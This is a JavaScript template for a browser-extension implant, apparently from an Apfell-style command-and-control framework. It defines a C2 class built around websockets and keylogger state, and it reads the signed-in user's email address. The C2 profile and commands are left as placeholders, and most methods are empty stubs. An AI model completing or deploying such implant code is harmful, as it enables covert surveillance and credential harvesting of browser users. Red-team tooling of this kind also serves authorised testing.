//--------------IMPLANT INFORMATION-----------------------------------
class implant{
    constructor(){
        this.hostinfo = "chrome";
        this.userinfo = '';
        this.procinfo = 0;
        this.uuid = "UUID_HERE";
        this.apfellid = 0;
    }
}

var apfell = new implant();
//--------------Base C2 INFORMATION---------------------------------------
class baseC2 {
    constructor(host, port, endpoint, ssl, interval) {
        this.host = host;
        this.port = port;
        this.proto = '';
        this.interval = interval;
        this.commands = {};

        if (ssl === true) {
            this.proto = 'wss://';
        } else {
            this.proto = 'ws://';
        }
        this.server = `${this.proto}${this.host}:${this.port}/${endpoint}`;
    }

    getInterval(){
        return this.interval;
    }

    getConfig(){
        // return the c2 config
    }

    postResponse(){
        //output a response to a task
    }
    setConfig(){
        //Not implemented
    }
    download(){
        //Not Implemented
    }
    upload(){
        //Not implemented
    }

    checkIn(){
        // register this callback with the server
    }

    sendResponse(){
        // Send a response to the server
    }
}

//-------------SHARED COMMAND CODE ------------------------
let keylogTaskID = 0;
let keyloggers = [];


chrome.identity.getProfileUserInfo(function(info){
    apfell.userinfo = info.email;
});
// C2 Profile Code
C2PROFILE_HERE
// Commands
COMMANDS_HERE